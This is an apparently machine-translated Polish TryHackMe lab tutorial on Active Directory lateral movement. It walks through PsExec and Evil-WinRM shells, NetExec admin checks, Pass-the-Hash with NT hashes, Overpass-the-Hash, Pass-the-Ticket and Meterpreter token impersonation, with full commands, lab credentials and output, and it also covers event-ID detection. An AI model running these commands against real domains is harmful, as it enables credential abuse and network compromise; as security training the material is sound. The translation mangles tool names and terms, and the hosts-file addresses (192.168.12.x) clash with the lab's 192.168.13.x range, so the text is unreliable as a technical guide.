---

Włamałeś się do sieci, enumerowałeś domenę i zebrałeś dane uwierzytelniające z zainfekowanej stacji roboczej. Co teraz? Pojedynczy zainfekowany host rzadko posiada klucze do królestwa. Poufne dane, kontroler domeny i konta usług z podwyższonymi uprawnieniami są rozproszone w sieci na innych hostach. Aby do nich dotrzeć, musimy  **działać lateralnie** .

Przemieszczanie boczne to proces polegający na wykorzystaniu prawidłowych poświadczeń, skrótów lub biletów do przemieszczania się z jednego zainfekowanego hosta na drugi w środowisku Active Directory. Stanowi on pomost między posiadaniem pojedynczej stacji roboczej a osiągnięciem kompromitacji w całej domenie i jest fazą, w której pozyskane poświadczenia stają się naprawdę niebezpieczne.

W tym pomieszczeniu omówimy podstawowe techniki ruchu poziomego, zaczynając od zainfekowanej stacji roboczej i przesuwając się coraz głębiej w sieć, aż dotrzemy do kontrolera domeny.

## Cele edukacyjne

W tej sali omówimy następujące techniki ruchów bocznych:

- Wykonywanie poleceń na zdalnych hostach za pomocą PsExec i Evil-WinRM
- Wykonywanie ataków Pass-the-Hash w celu uwierzytelnienia NTLM hasze bezpośrednio — nie jest potrzebne hasło w postaci zwykłego tekstu
- Zrozumienie jak Kerberos ponowne wykorzystanie biletów i Overpass-the-Hash rozszerzają możliwości poruszania się w przestrzeni publicznej
- Tunelowanie przez zainfekowane hosty w celu dotarcia do niedostępnych w inny sposób segmentów sieci za pomocą SSH Serwery proxy SOCKS
- Środki obronne wykrywające i zapobiegające ruchom bocznym

To z pewnością nie jest wyczerpująca lista technik ruchu bocznego, ale obejmuje podstawowe umiejętności, z których będziesz korzystać w każdej bitwie. Bardziej zaawansowane techniki – w tym nadużywanie biletów Kerberos, zaawansowane obracanie z Chisel i Ligolo-ng oraz łańcuchy obrotowe z wieloma hostami – zostaną omówione w kolejnych salach.

## Wymagania wstępne

Zanim rozpoczniesz pracę w tym pokoju, powinieneś zapoznać się z koncepcjami poruszanymi w następujących pokojach:

- [Podstawy usługi Active Directory:](https://tryhackme.com/room/winadbasics)  Zrozumienie OGŁOSZENIEobiekty, grupy i struktura domeny
- [Wprowadzenie do uwierzytelniania w usłudze Active Directory:](https://tryhackme.com/room/introtoactivedirectoryauthentication)  poznaj skróty NTLM, bilety Kerberos i sposób działania uwierzytelniania w usłudze Active Directory
- [Wprowadzenie do gromadzenia poświadczeń AD:](https://tryhackme.com/room/introtocredentialharvesting)  Dowiedz się, gdzie przechowywane są poświadczenia i jak je wyodrębnić

Powinieneś również swobodnie posługiwać się podstawowymi funkcjami systemu Windows iLinuxoperacje wiersza poleceń.

## Uruchamianie sieci

Zanim przejdziesz do następnego zadania, kliknij zielony przycisk **Start** pod schematem sieci. Daj sieci wystarczająco dużo czasu na uruchomienie.

Z siecią można połączyć się na dwa sposoby:

**AttackBox**

Jeśli korzystasz z internetowego AttackBoxa, połączenie z siecią zostanie nawiązane automatycznie po uruchomieniu AttackBoxa ze strony pokoju. Możesz to sprawdzić, uruchamiając polecenie `ping`dla adresu IP hosta `ROOTDC.THM.LOC`. Powinieneś również poświęcić chwilę na zanotowanie swojego  adresu IP.VPN IP. Używając  `ifconfig` lub  `ip a`, zanotuj adres IP `tun0`karty sieciowej. To Twój adres IP i powiązany interfejs, którego powinieneś używać podczas wykonywania ataków w zadaniach.

**Inni gospodarze**

Jeśli zamierzasz użyć własnej maszyny atakującej, plik konfiguracyjny OpenVPN zostanie dla Ciebie wygenerowany po dołączeniu do pokoju. Kliknij  przycisk **„Pobierz profil VPN”** w Panelu sterowania siecią:

![](https://cdn-images.tryhackme.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1777848962503.png)

Użyj klienta OpenVPN, aby się połączyć. Ten przykład pokazano na  komputerze [z systemem Linux](https://tryhackme.com/access)  . Skorzystaj z tego przewodnika, aby połączyć się w systemie  [Windows](https://tryhackme.com/access)  lub  [macOS](https://tryhackme.com/access) .

OpenVPN

```bash
user@tryhackme:$ sudo openvpn ad-introlatmov.ovpn
2026-05-01 15:30:18 OpenVPN 2.6.14 aarch64-apple-darwin24.2.0 [SSL (OpenSSL)] [LZO] [LZ4] [PKCS11] [MH/RECVDA] [AEAD]
2026-05-01 15:30:18 library versions: OpenSSL 3.6.1 27 Jan 2026, LZO 2.10
[....]
2026-05-01 15:30:20 /sbin/ifconfig utun4 192.168.21.2 192.168.21.2 netmask 255.255.255.0 mtu 1500 up
2026-05-01 15:30:20 /sbin/route add -net 192.168.21.0 192.168.21.2 255.255.255.0
add net 192.168.21.0: gateway 192.168.21.2
2026-05-01 15:30:20 /sbin/route add -net 192.168.11.0 192.168.21.1 255.255.255.0
add net 192.168.11.0: gateway 192.168.21.1
2026-05-01 15:30:20 Initialization Sequence Completed
```

Komunikat „Sekwencja inicjalizacji ukończona” informuje, że nawiązano połączenie z siecią.

## Konfiguracja DNS

Zanim zaczniemy, musimy upewnić się, że nasz komputer atakujący potrafi rozpoznać nazwy hostów używane w tym laboratorium. Powyższy diagram sieciowy przedstawia środowisko, w którym będziemy pracować:

|Gospodarz|Adres IP|Rola|
|---|---|---|
|Serwer WWW|192.168.13.71|Zagrożony host Linux i punkt obrotowy SSH. Obsługuje również wewnętrzne usługi sieciowe (Gitea).|
|WRK|192.168.13.61|Stacja robocza Windows|
|SERWER1|192.168.13.51|Serwer Windows|
|ROOTDC|192.168.13.100|Kontroler domeny|

Zaczynamy od następujących rzeczy:

- **Dostęp SSH** do serwera WWW za `jdoe`pomocą hasła`Summer2026!`
- `jdoe`ma uprawnienia **administratora lokalnego** w WRK
- `jdoe`jest członkiem grupy **użytkowników zdalnego zarządzania** na serwerze SERVER1 (ale nie jest administratorem lokalnym)
- Zebrany hash NTLM czeka na odkrycie na jednym z hostów w miarę postępów w ćwiczeniach

Jest to odzwierciedlenie rzeczywistej sytuacji: naruszyłeś bezpieczeństwo jednego hosta, masz zestaw prawidłowych danych uwierzytelniających domenę i teraz musisz ich użyć, aby uzyskać dostęp do dalszych elementów sieci.

Istnieją dwa sposoby konfiguracji rozpoznawania nazw na komputerze atakującego:

**Użyj kontrolera domeny jako serwera DNS (inne hosty)**

Gdy używasz własnej maszyny atakującej, kontroler domeny służy jako serwer DNS dla `thm.loc`, więc skierowanie na niego programu rozpoznającego domeny automatycznie obsługuje wszystkie wyszukiwania domen:

```shell
user@attackbox:~$ sudo systemctl disable --now systemd-resolved
user@attackbox:~$ echo "nameserver 192.168.13.100" | sudo tee /etc/resolv.conf
```

Jest to zalecane podejście, ponieważ umożliwia ono równieżDNS- oparte na wyliczeniach, takich jak wyszukiwanie rekordów SRV w Zadaniu 3. Jeśli potrzebujesz również zewnętrznego rozwiązania internetowego, dodaj drugi wiersz: `nameserver 1.1.1.1`.

**Statyczne wpisy /etc/hosts (AttackBox)**

W AttackBoxie, jeśli nie chcesz zmieniać konfiguracji DNS, możesz dodać wpisy ręcznie:

```shell
user@attackbox:~$ sudo nano /etc/hosts
```

Dodaj następujące:

```shell
192.168.12.100    thm.loc
192.168.12.71     git.thm.loc
```

Dotyczy to wszystkich ćwiczeń praktycznych.

Jeśli napotkasz jakiekolwiek problemy, skontaktuj się z nami na  [Discordzie(otwiera się w nowej karcie)](https://discord.com/invite/tryhackme)lub przez e-mail na adres `support@tryhackme.com`.

Skoro już rozumiemy tę koncepcję, przełóżmy ją na praktykę. Najbardziej bezpośrednią formą ruchu poziomego jest wykonywanie poleceń na zdalnym hoście przy użyciu legalnych protokołów administracyjnych systemu Windows. To nie są exploity, to te same mechanizmy, których administratorzy systemów używają na co dzień do zarządzania swoimi środowiskami. Jako atakujący, po prostu wykorzystujemy je, wykorzystując skradzione dane uwierzytelniające.

Wszystkie techniki w tym zadaniu mają wspólny wymóg: konto, za pomocą którego się uwierzytelniamy, musi mieć uprawnienia administratora lokalnego na hoście docelowym. Wynika to z faktu, że mechanizmy bazowe, takie jak zapisywanie w udziałach administracyjnych, tworzenie usług i interakcja z WMI, wszystkie są dostępne na poziomie administratora. Jedynym wyjątkiem jest WinRM, który pozwala również członkom grupy Remote Management Users.

W tym zadaniu zajmiemy się dwiema najczęściej używanymi metodami zdalnego wykonywania: PsExec i Evil-WinRM . Następnie omówimy pozostałe metody jako punkt odniesienia w rzeczywistych zastosowaniach.

PsExec ( Impacket (otwiera się w nowej karcie))
PsExec (otwiera się w nowej karcie) jest prawdopodobnie najbardziej znaną techniką ruchu bocznego. Impacket psexec.py( implementacja w Pythonie)(otwiera się w nowej karcie)Program PsExec łączy się z celem przez SMB, przesyła plik binarny usługi, tworzy i uruchamia usługę systemu Windows w celu jej wykonania oraz zwraca powłokę interaktywną; wszystko to działa jako NT AUTHORITY\SYSTEM.

Przyjrzyjmy się bliżej, jak to działa, ponieważ zrozumienie mechanizmu jest kluczowe dla zrozumienia, dlaczego hałas jest generowany i jak jest wykrywany:

Uwierzytelnij się w celu SMB(port 445) i otwórz IPC$udział.
Połącz się z ADMIN$ (który mapuje się do C:\Windows\) i prześlij plik wykonywalny usługi o losowej nazwie.
Otwórz uchwyt do Menedżera Kontroli Usług (SCM) za pomocą \PIPE\svcctlnazwanego potoku i wywołaj CreateServiceW. Spowoduje to wygenerowanie zdarzenia o identyfikatorze 7045 (zainstalowano nową usługę) w dzienniku zdarzeń systemowych.
Wywołanie StartServiceW jest plikiem binarnym wykonywanym jako LocalSystem. Dane wejściowe i wyjściowe są przekierowywane przez nazwane potoki.
Po wyjściu usługa jest zatrzymywana, usuwana, a plik binarny jest usuwany z ADMIN$.
Dlatego PsExec udostępnia powłokę SYSTEM zamiast powłoki jako uwierzytelnionego użytkownika. Polecenia są uruchamiane w kontekście usługi systemu Windows, która jest wykonywana jako LocalSystem. Z tego powodu PsExec jest uważany za uciążliwy : zapisuje plik na dysku, tworzy usługę i generuje wiele wykrywalnych wpisów w dzienniku zdarzeń.

Praktyka: PsExec do WRK

Użyjmy PsExec, aby przejść poziomo do WRK. Mamy jdoedane uwierzytelniające w postaci zwykłego tekstu i wiemy, że jdoejest on administratorem lokalnym na tym hoście, więc wszystkie wymagania wstępne dla PsExec są spełnione.

Zanim uruchomimy PsExec, zawsze warto sprawdzić, czy faktycznie mamy dostęp administracyjny do systemu docelowego. NetExec (otwiera się w nowej karcie)szybko to robi:

Terminal
user@machine$ 
nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc
SMB         192.168.13.61   445    WRK1             [*] Windows 10 / Server 2019 Build 17763 x64 (name:WRK1) (domain:thm.loc) (signing:False) (SMBv1:False)
SMB         192.168.13.61   445    WRK1             [+] thm.loc\jdoe:Summer2026! (Pwn3d!)
Poszukaj  (Pwn3d!)znacznika w wynikach — potwierdza on dostęp administratora lokalnego i informuje, że PsExec będzie działać. Teraz uruchommy powłokę:

Terminal
user@attackbox:~$ psexec.py thm.loc/jdoe:'Summer2026!'@192.168.13.61

Impacket v0.10.1.dev1 - Copyright 2022 Fortra

[*] Requesting shares on 192.168.13.61.....

[*] Found writable share ADMIN$

[*] Uploading file RaNdOm.exe

[*] Opening SVCManager on 192.168.13.61.....

[*] Creating service RaNd on 192.168.13.61.....

[*] Starting service RaNd.....

[!] Press help for extra shell commands

Microsoft Windows [Version 10.0.17763.xxxx]

(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami

nt authority\system
Zwróć uwagę, że dane wyjściowe potwierdzają każdy opisany przez nas krok: znaleziono  ADMIN$udział z możliwością zapisu, przesłano plik, utworzono usługę i uruchomiono ją. Dane whoamiwyjściowe potwierdzają, że działamy jako SYSTEM, a nie jako jdoe.

Pobierz pierwszą flagę na tym hoście:

Terminal
C:\Windows\system32> type C:\Users\jdoe\Desktop\flag3a.txt
Odkrywanie większej ilości łupów
Skoro mamy dostęp do SYSTEMU na WRK, sprawdźmy, co jeszcze znajduje się na tym hoście. W prawdziwym starciu zawsze warto przeszukać zainfekowany host w poszukiwaniu dodatkowych danych uwierzytelniających, plików konfiguracyjnych lub czegokolwiek, co pomoże w dalszym działaniu. Przyjrzyjmy się folderowi Dokumenty Administratora:

Terminal
C:\Windows\system32> type C:\Users\Administrator\Documents\loot.txt

Administrator:500:redacted
Wygląda to na wynik działania narzędzia do zbierania danych uwierzytelniających. To skrót NT lokalnego konta administratora w  secretsdumpformacie. Nie mogliśmy odczytać tego pliku, ponieważ jdoejest on ograniczony do kont administratora i systemowego. Jednak ponieważ PsExec udostępnił nam powłokę systemową, mamy do niego dostęp.

Zwróć uwagę na ten skrót NT: fa0....12. Będzie nam potrzebny w następnym zadaniu.

Wpisz exit, aby zamknąć powłokę PsExec.

Wskazówka: Jeśli PsExec zawiesza się lub nie nawiązuje połączenia, najczęstszą przyczyną jest ADMIN$brak dostępu do udziału (zapora sieciowa blokuje port 445), brak uprawnień administratora lokalnego na serwerze docelowym (nie będzie to widoczne (Pwn3d!)w NetExec) lub wymuszone podpisywanie SMB. Zawsze sprawdzaj dostęp w NetExec.

Zło-WinRM
Zdalne zarządzanie systemem Windows (WinRM) to protokół firmy Microsoft, który zapewnia zdalny dostęp do powłoki przez protokół HTTP (port 5985) lub HTTPS (port 5986). Jest to protokół, z którego korzysta funkcja PowerShell Remoting i jest domyślnie włączony w systemach operacyjnych Windows Server.

Zło-WinRM(otwiera się w nowej karcie)to narzędzie stworzone specjalnie do interakcji z WinRM. Zapewnia interaktywną sesję programu PowerShell na hoście zdalnym, a także przydatne funkcje, takie jak przesyłanie i pobieranie plików, ładowanie skryptów w pamięci oraz wstrzykiwanie bibliotek DLL.

Istnieją dwie kluczowe różnice między Evil-WinRM i PsExec:

Kontekst powłoki: sesje WinRM są uruchamiane jako uwierzytelniony użytkownik , a nie jako SYSTEM. Otrzymujesz uprawnienia konta, za pomocą którego się uwierzytelniłeś.
Wymagania grupy: Konto musi być członkiem jednej z grup BUILTIN\Administrators lub BUILTIN\Remote Management Users na hoście docelowym. Dzięki temu WinRM jest nieco bardziej elastyczny niż PsExec, który wymaga dostępu administratora do ADMIN$udziału.
WinRM jest również znacznie cichszy niż PsExec. Nie zapisuje plików na dysku, nie tworzy usług i nie generuje zdarzenia o identyfikatorze 7045. Generuje standardowe zdarzenie logowania do sieci (identyfikator zdarzenia 4624, typ 3), które wtapia się w normalny ruch administracyjny.

Ćwiczenie: Evil-WinRM do SERVER1

Połączmy się z serwerem SERWER1 za pomocą Evil-WinRM. W tym laboratorium użytkownik jdoejest członkiem grupy Remote Management Usersna serwerze SERWER1, ale nie jest administratorem lokalnym, więc WinRM jest tutaj odpowiednim narzędziem. PsExec nie zadziała, ponieważ jdoenie można zapisać do ADMIN$udziału na tym hoście.

Terminal
user@attackbox:~$ evil-winrm -i 192.168.13.51 -u jdoe -p 'Summer2026!'
Powinieneś zobaczyć interaktywnyPowerShellsesja:

Terminal
user@attackbox:~$ evil-winrm -i 192.168.13.51 -u jdoe -p 'Summer2026!'

Evil-WinRM shell v3.7

*Evil-WinRM* PS C:\Users\jdoe\Documents> whoami

thm\jdoe

*Evil-WinRM* PS C:\Users\jdoe\Documents> hostname

SERVER1
Zwróć uwagę, że  whoamizwraca thm\jdoe, a nie SYSTEM. Działamy w kontekście użytkownika, którego uwierzytelniliśmy. Oznacza to, że możemy uzyskać dostęp tylko do zasobów z jdoeuprawnieniami do odczytu lub zapisu.

Pobierz drugą flagę:

Terminal
*Evil-WinRM* PS C:\Users\jdoe\Documents> type C:\Users\jdoe\Desktop\flag3b.txt
Teraz spróbuj uzyskać dostęp do Pulpitu Administratora:

Terminal
*Evil-WinRM* PS C:\Users\jdoe\Documents> type C:\Users\Administrator\Desktop\flag4.txt

Access is denied.
Dostęp zabroniony, ponieważ  jdoenie jest to administrator lokalny na serwerze SERWER1. Widzimy własne pliki, ale profil administratora jest niedostępny. Będziemy potrzebować innego podejścia, aby uzyskać dostęp do tych plików i właśnie to omówimy w zadaniu 4.

Wpisz exit, aby zamknąć powłokę WinRM.

Uwaga: Evil-WinRM obsługuje również uwierzytelnianie oparte na hashu z -Hflagą: evil-winrm -i TARGET -u Administrator -H NTLM_HASH. Dzięki temu jest naturalnym towarzyszem ataków Pass-the-Hash, które wykorzystamy w następnym zadaniu.

Inne metody zdalnego wykonywania
PsExec i WinRM to dwie metody, na których skupimy się w tym pomieszczeniu, ale istnieje kilka innych technik zdalnego wykonywania, które warto poznać w kontekście rzeczywistych działań. Każda z nich korzysta z innego protokołu Windows i wiąże się z innymi kompromisami w zakresie ukrycia, niezawodności i wykrywania:

Metoda	Narzędzie	Mechanizm	Poziom hałasu	Kiedy używać
WMI	wmiexec.py	DCOMWin32_Process.Create	Niższy: brak instalacji usługi, brak pliku zapisanego na dysku	Gdy PsExec zostanie zablokowany lub wykryty
DCOM	dcomexec.py	MMC20.Application / ShellWindows Obiekty DCOM	Niski: używa legalnych ścieżek automatyzacji COM	Gdy SCM jest zablokowany, ale DCOM jest dostępny
SMBExec	smbexec.py	Tworzy usługę, która uruchamia się cmd.exe /ci zapisuje dane wyjściowe do pliku tymczasowego	Średni: nadal generuje zdarzenie o identyfikatorze 7045, ale na dysku nie ma pliku binarnego	Kiedy program antywirusowy wykryje przesłanie pliku binarnego PsExec
AtExec	atexec.py	Planuje zadanie jednorazowe za pośrednictwem harmonogramu zadań RPC	Średni: generuje identyfikator zdarzenia 4698 (utworzono zadanie)	Gdy zarówno SCM, jak i DCOM są zablokowane
RDP	xfreerdp/rdesktop	Pełna sesja zdalnego pulpitu GUI (port 3389)	Wysoki: zdarzenie logowania interaktywnego (4624 typ 10)	Kiedy potrzebujesz dostępu do interfejsu graficznego dla aplikacji
NetExec	nxc smb TARGET -x "cmd"	Używa protokołu SMB do szybkiego wykonywania jednorazowych poleceń	Różnie	Szybkie wykonywanie poleceń bez pełnej sesji interaktywnej
Każdy ze skryptów Impacket akceptuje te same opcje uwierzytelniania, a mianowicie hasła w postaci zwykłego tekstu, skróty NTLM ( -hashes) i bilety Kerberos ( -k). Oznacza to, że po poznaniu składni jednego z nich, pozostałe będą działać według tego samego schematu.

Do szybkiego, nieinteraktywnego wykonywania poleceń na wielu hostach, NetExec jest szczególnie przydatny:

Terminal
# Execute a command via cmd.exe (lowercase -x)

user@attackbox:~$ nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc -x 'whoami /all'

# Execute a PowerShell command (uppercase -X)

user@attackbox:~$ nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc -X '$PSVersionTable'
Wykrywanie w skrócie
Każda metoda zdalnego wykonywania pozostawia nieco inny ślad kryminalistyczny. Poniższa tabela podsumowuje kluczowe zdarzenia systemu Windows. Identyfikatory związane z tymi technikami, coś, co pojawi się ponownie, gdy będziemy omawiać środki łagodzące w Zadaniu 6:

Identyfikator zdarzenia	Dziennik	Co to oznacza
4624 (Typ 3)	Bezpieczeństwo	Logowanie do sieci — generowane przez każdą technikę opartą na SMB/WinRM/WMI
4648	Bezpieczeństwo	Logowanie przy użyciu jawnych danych uwierzytelniających — generowane, gdy dane uwierzytelniające są przekazywane bezpośrednio
7045	System	Zainstalowano nową usługę — podpis PsExec i SMBExec
4697	Bezpieczeństwo	Usługa zainstalowana — nowszy odpowiednik 7045
4698	Bezpieczeństwo	Utworzono zaplanowane zadanie — podpis AtExec
4688	Bezpieczeństwo	Tworzenie procesów — aby było przydatne, wymaga audytu wiersza poleceń
Najbardziej wiarygodnym wskaźnikiem PsExec jest identyfikator zdarzenia 7045 w połączeniu z krótką, losową nazwą usługi. Legalne usługi rzadko mają 4-znakowe losowe nazwy.

xfreerdp /v:192.168.13.61 /u:jdoe /d:thm.loc /p:'Summer2026!' /dynamic-resolution

W Zadaniu 3 użyliśmy danych uwierzytelniających w postaci zwykłego tekstu do uwierzytelnienia na zdalnych hostach. To działa, ale zakłada, że ​​faktycznie znamy hasło. W wielu rzeczywistych sytuacjach zbierane przez nas dane uwierzytelniające wcale nie są hasłami w postaci zwykłego tekstu, ponieważ… NTLM Skróty wyodrębnione z pamięci lub lokalnej bazy danych SAM. Dobra wiadomość jest taka, że ​​nie musimy ich łamać. Możemy z nich korzystać bezpośrednio.

Tutaj właśnie pojawia się Pass-the-Hash .

Jak działa Pass-the-Hash
Uwierzytelnianie NTLM wykorzystuje mechanizm „wyzwanie-odpowiedź”. Gdy klient uwierzytelnia się na serwerze, serwer wysyła losowe wyzwanie (nonce), a klient szyfruje je za pomocą skrótu NT hasła użytkownika. Następnie serwer weryfikuje odpowiedź, porównując ją z własną kopią skrótu. Kluczową kwestią jest to, że hasło w postaci zwykłego tekstu nigdy nie jest wykorzystywane w tej wymianie, a jedynie skrót jest używany do obliczenia odpowiedzi.

Oznacza to, że mając skrót NT, można przeprowadzić procedurę uwierzytelniania bez znajomości hasła. Serwer nie rozróżnia klienta, który zahaszował hasło, od klienta, który już je posiadał – odpowiedź w obu przypadkach wygląda identycznie.

Pułapka zamieszania haszyszowego
Zanim przejdziemy dalej, wyjaśnijmy najczęstszą kwestię, która może być powodem nieporozumień dla początkujących. Istnieją dwie bardzo różne rzeczy, które ludzie potocznie nazywają „haszami NTLM” i nie można ich stosować zamiennie :

Typ	Skąd to pochodzi	Format	Czy potrafisz przekazać hash?
skrót NT	Baza danych SAM, NTDS.dit, pamięć LSASS (poprzez Mimikatz, secretsdump itp.)	32 znaki szesnastkowe:fa0af7f6a73316dd59f0be812dbf3c12	Tak
Skrót Net-NTLMv2	Przechwycone z sieci (poprzez Responder, wymuszenie .url, zatrucie LLMNR itp.)	Długie, wielopolowe:user::DOMAIN:challenge:hmac:blob	Nie: złam to lub przekaż dalej
W niektórych scenariuszach można przechwycić skrót Net-NTLMv2 za pomocą Respondera i złamać go za pomocą Hashcata. Tego typu skrótu nie można użyć w metodzie Pass-the-Hash. Jest to jednorazowy artefakt typu wyzwanie-odpowiedź, a nie podstawowy sekret.

Skróty potrzebne do Pass-the-Hash to te wyodrębnione bezpośrednio z pamięci lub bazy danych hosta – surowe skróty NT, które system Windows przechowuje i wykorzystuje do uwierzytelniania. To właśnie te skróty wyodrębniają narzędzia takie jak Mimikatz sekurlsa::logonpasswordsi Impacket secretsdump.py.

Korzystanie z łupów
W Zadaniu 3, po uzyskaniu powłoki SYSTEM w WRK za pomocą PsExec, odkryliśmy plik w lokalnym folderze Dokumenty Administratora. Przyjrzyjmy się ponownie jego zawartości:

C:\Windows\system32> type C:\Users\Administrator\Documents\loot.txt
Administrator:500:redacted:::
To jest standardowy format wyjściowy narzędzi takich jak secretsdump.py. Przyjrzyjmy się temu bliżej:

Administrator:nazwa konta.
500: Identyfikator względny (RID 500 = wbudowany administrator).
aa.....ee: skrót LM (jest to pusty/wyłączony skrót LM, który jest obecny we wszystkich nowoczesnych systemach Windows).
fa.....12: skrót NT. To jest wartość, której potrzebujemy.
To jest skrót NT lokalnego konta administratora, pobrany z WRK. Pytanie brzmi: czy to samo hasło administratora lokalnego (a zatem ten sam skrót) działa na innych hostach? W środowiskach bez rozwiązania LAPS (Local Administrator Password Solution) odpowiedź często brzmi: tak. To samo hasło administratora lokalnego jest używane na wielu komputerach.

Skanowanie w celu uzyskania dostępu administratora za pomocą NetExec
Zanim spróbujemy uzyskać powłokę, sprawdźmy, które hosty w sieci akceptują ten hash. NetExec może rozproszyć hash na wiele celów i wskazać nam, gdzie mamy dostęp administracyjny:

user@attackbox:~$ nxc smb 192.168.13.61 192.168.13.51 -u Administrator -H fa....12 --local-auth
Przyjrzyjmy się bliżej kluczowym parametrom:

-u Administrator:nazwa użytkownika powiązana z hashem.
-H fa....12: skrót NT (tylko 32-znakowy ciąg szesnastkowy). NetExec akceptuje również pełny  LM:NTformat.
--local-auth: To jest krytyczne. Informuje NetExec o konieczności uwierzytelnienia się w  lokalnym SAM na każdym celu, a nie w kontrolerze domeny. Ponieważ przekazujemy lokalny skrót administratora, potrzebujemy lokalnego uwierzytelnienia. Bez tej flagi NetExec próbowałby uwierzytelnić się w domenie, a skrót nie byłby uwierzytelniany, ponieważ nie pasowałby do konta domeny.
Powinieneś zobaczyć wynik podobny do poniższego:

Terminal
user@attackbox:~$ nxc smb 192.168.13.61 192.168.13.51 -u Administrator -H fa0.....12 --local-auth
SMB   192.168.13.61  445  WRK1    [] Windows 10 / Server 2019 Build 17763 x64 (name:WRK1) (domain:WRK1) (signing:False) (SMBv1:False)
SMB   192.168.13.51  445  SERVER1 [] Windows 10 / Server 2019 Build 17763 (name:SERVER1) (domain:SERVER1) (signing:False) (SMBv1:False)
SMB   192.168.13.61  445  WRK1    [+] WRK1\Administrator:fa......12 (Pwn3d!)
SMB   192.168.13.51  445  SERVER1 [+] SERVER1\Administrator:fa.....12 (Pwn3d!)
(Pwn3d!)Szukamy właśnie tego  znacznika, ponieważ oznacza on, że konto ma uprawnienia administratora lokalnego na tym hoście. W tym przypadku ten sam skrót administratora lokalnego jest ważny zarówno na serwerze WRK, jak i na serwerze SERVER1. Właśnie takiemu scenariuszowi ma zapobiegać LAPS i jest on niepokojąco powszechny w rzeczywistych środowiskach.

Uwaga: Jeśli widzisz [+]bez (Pwn3d!), dane uwierzytelniające są prawidłowe, ale konto nie ma uprawnień administratora lokalnego. Nadal możesz odczytywać udziały plików lub usługi zapytań, ale nie będziesz mógł korzystać z PsExec ani innych metod wykonywania wymagających dostępu administratora.

Pobieranie powłoki za pomocą metody Pass-the-Hash
Skoro wiemy już, że hash daje nam dostęp administracyjny na serwerze SERWER1, użyjmy go do utworzenia powłoki. Każde narzędzie w pakiecie Impacket akceptuje -hashesflagę jako alternatywę dla hasła:

user@attackbox:~$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fa.....12 Administrator@192.168.13.51
Flaga -hashesma format LM:NT. Jeśli masz tylko połowę NT, możesz pozostawić część LM pustą:

user@attackbox:~$ psexec.py -hashes :fa......12 Administrator@192.168.13.51
Powinieneś uruchomić powłokę SYSTEM na serwerze SERVER1, tak jak udało nam się to zrobić w zadaniu 3 na serwerze WRK, ale tym razem nie znając hasła w postaci zwykłego tekstu .

Skoro mamy dostęp do SYSTEMU na serwerze SERVER1 jako Administrator, sprawdźmy, co jeszcze znajduje się na tym hoście. Sprawdź folder Dokumenty Administratora:

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag4.txt
THM{Plac3holder_Fl@g}

C:\Windows\system32> type C:\Users\Administrator\Documents\da_creds.txt
THM\Administrator:500:aad3b435b51404eeaad3b435b51404ee:25....ea:::
Ciekawe! Na tym hoście znajduje się drugi plik hashujący, przeznaczony dla konta administratora domeny ( THM\Administrator). Skrót NT to 25....ea. Zapamiętaj go, ponieważ będzie nam potrzebny w zadaniu 5, aby dotrzeć do kontrolera domeny.

Uwaga: W rzeczywistym starciu tak właśnie łączą się łańcuchy ruchu bocznego. Lokalny hash administratora na WRK doprowadził nas do SERWERA1, gdzie znaleźliśmy hash administratora domeny, prawdopodobnie pozostawiony po poprzedniej sesji administracyjnej. Każdy host, którego przejęcie zostanie naruszone, potencjalnie przechowuje klucze do następnego.

Evil-WinRM obsługuje również uwierzytelnianie oparte na hashu, wykorzystując -Hflagę:

user@attackbox:~$ evil-winrm -i 192.168.13.51 -u Administrator -H fa....12
To daje Ci sesję PowerShell na serwerze SERWER1 jako administrator lokalny. Ponownie, używając tylko skrótu.

Inne techniki ponownego wykorzystania poświadczeń
Pass-the-Hash to najpopularniejsza technika ponownego wykorzystania danych uwierzytelniających, ale nie jedyna. Poniższe techniki rozszerzają tę koncepcję na uwierzytelnianie oparte na Kerberos i zostaną szczegółowo omówione w kolejnych częściach:

Bilet wstępu (PtT)

Zamiast przekazywać hash, wstrzykujesz do swojej sesji skradziony bilet Kerberos (TGT lub bilet serwisowy). Jest to przydatne, gdy uwierzytelnianie NTLM jest ograniczone, ale Kerberos jest nadal dostępny. Narzędzia takie jak Mimikatz( kerberos::ptt) i Rubeus( ptt) mogą importować .kirbilub zakodować bilety w formacie Base64 do pamięci:

# Mimikatz
mimikatz # kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi
Przekazanie klucza (Overpass-the-Hash)

Ta technika łączy NTLM iKerberosUżywasz skrótu NT, aby zażądać prawidłowego biletu Kerberos TGT z Centrum Dystrybucji Kluczy, skutecznie konwertując skrót na bilet. Wynikowa sesja ma ważny bilet Kerberos i umożliwia dostęp do usług wyłącznie Kerberos. Mimikatz obsługuje to za pomocą  sekurlsa::pth:

mimikatz # sekurlsa::pth /user:Administrator /domain:thm.loc /ntlm:fa0.....12 /run:cmd.exe
W nowo cmd.exeotwartym oknie podana będzie oryginalna nazwa użytkownika whoami, lecz po uruchomieniu klistzostanie ujawniona wstrzyknięta tożsamość Kerberos — jest to czytelny przykład interakcji między dwoma protokołami uwierzytelniania.

Podszywanie się pod token 

Jeśli masz już dostęp do SYSTEMU na hoście (np. poprzez PsExec), możesz ukraść token dostępu dowolnego innego użytkownika, który jest aktualnie zalogowany. Nie są wymagane żadne dane uwierzytelniające ani skróty, wystarczy podszyć się pod jego sesję. Narzędzia takie jak Incognito (dostępne jako moduł Meterpretera) mogą wyświetlić listę dostępnych tokenów i podszyć się pod nie:

meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "THM\\Administrator"
Jest to szczególnie skuteczne, gdy administrator domeny jest zalogowany do tego samego hosta, którego bezpieczeństwo zostało naruszone, a jego token znajduje się w pamięci i czeka na kradzież.

Najważniejsze wnioski
Metoda Pass-the-Hash pokazuje, dlaczego zbieranie danych uwierzytelniających jest tak niebezpieczne. Pojedynczy skrót NTLM, składający się z 32 znaków szesnastkowych, może odblokować dostęp do każdego hosta w domenie, na którym dane konto ma uprawnienia administratora. W środowiskach bez LAPS, gdzie to samo lokalne hasło administratora jest używane na wielu komputerach, jeden skrót staje się kluczem głównym dla całej sieci.

